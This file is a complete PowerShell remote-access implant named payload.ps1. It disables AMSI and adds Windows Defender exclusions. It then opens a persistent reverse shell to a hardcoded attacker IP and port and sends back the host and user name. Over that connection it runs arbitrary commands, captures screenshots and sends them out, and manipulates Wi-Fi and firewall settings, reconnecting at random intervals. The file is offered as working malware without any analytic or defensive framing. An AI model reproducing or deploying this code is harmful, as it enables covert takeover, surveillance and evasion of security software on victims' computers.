# payload.ps1 – Minimal Working (Shell + Screenshot + WiFi + Block/Unblock)
$ATTACKER_IP = "192.168.100.32"
$PORT = 7777
$WIFI_ADAPTER = "Wi-Fi"
$MIN_RECONNECT = 10
$MAX_RECONNECT = 30

# AMSI Bypass
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

# Defender Exclusion
try { Add-MpPreference -ExclusionPath $PSScriptRoot -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } catch {}

function Test-Admin {
    $w = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $w.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Screenshot {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $bytes = $ms.ToArray()
        $bitmap.Dispose(); $graphics.Dispose(); $ms.Close()
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

function Set-WiFi {
    param($Action)
    $adapter = $WIFI_ADAPTER
    # If default fails, try to detect
    if (-not (netsh interface show interface $adapter 2>$null)) {
        $adapters = netsh wlan show interfaces | Select-String "Name" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if ($adapters) { $adapter = $adapters[0] }
    }
    switch ($Action) {
        "enable"   { netsh interface set interface $adapter admin=enabled 2>$null }
        "disable"  { netsh interface set interface $adapter admin=disabled 2>$null }
        "weak"     {
            netsh interface ip set address $adapter static 192.168.1.100 255.255.255.0 192.168.1.1 2>$null
            netsh interface ip set dns $adapter static 1.1.1.1 validate=no 2>$null
            netsh interface ip add dns $adapter 8.8.8.8 index=2 validate=no 2>$null
        }
        "fix"      {
            netsh interface ip set address $adapter dhcp 2>$null
            netsh interface ip set dns $adapter dhcp 2>$null
        }
    }
}

function Block-Internet {
    netsh advfirewall firewall delete rule name="InternetBlock" 2>$null
    netsh advfirewall firewall delete rule name="BlockAllOut" 2>$null
    netsh advfirewall firewall add rule name="InternetBlock" dir=out action=block enable=yes
    return "Internet blocked"
}
function Unblock-Internet {
    netsh advfirewall firewall delete rule name="InternetBlock"
    netsh advfirewall firewall delete rule name="BlockAllOut"
    return "Internet unblocked"
}
function Flush-DNS {
    ipconfig /flushdns
    return "DNS cache flushed"
}

function Get-ReverseShell {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ATTACKER_IP, $PORT)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % {0}

        $info = "$env:COMPUTERNAME|$env:USERNAME"
        $sendbyte = [text.encoding]::ASCII.GetBytes($info + "`n")
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
            $cmd = $data.Trim()

            if ($cmd -eq "screenshot") {
                $img = Get-Screenshot
                $line = "SCREEN:" + $img + "`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($line)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }
            if ($cmd -match "^(wifioff|wifion|wifiweak|wififix)$") {
                Set-WiFi $cmd.Substring(3)
                $sendback = "Wi-Fi command executed`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }
            if ($cmd -eq "block") {
                $sendback = Block-Internet + "`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }
            if ($cmd -eq "unblock") {
                $sendback = Unblock-Internet + "`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }
            if ($cmd -eq "dnsflush") {
                $sendback = Flush-DNS + "`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }
            if ($cmd -match "^cd\s+(.+)$") {
                try {
                    Set-Location $matches[1]
                    $sendback = "OK`n"
                } catch {
                    $sendback = "Error: $($_.Exception.Message)`n"
                }
                $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }

            # Default: execute as PowerShell command
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            if ($output.Length -eq 0) { $output = "OK`n" }
            $prompt = "PS " + (Get-Location).Path + "> "
            $sendback = $output + $prompt
            $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {}
}

function Main {
    while ($true) {
        Get-ReverseShell
        Start-Sleep -Seconds (Get-Random -Minimum $MIN_RECONNECT -Maximum $MAX_RECONNECT)
    }
}
Main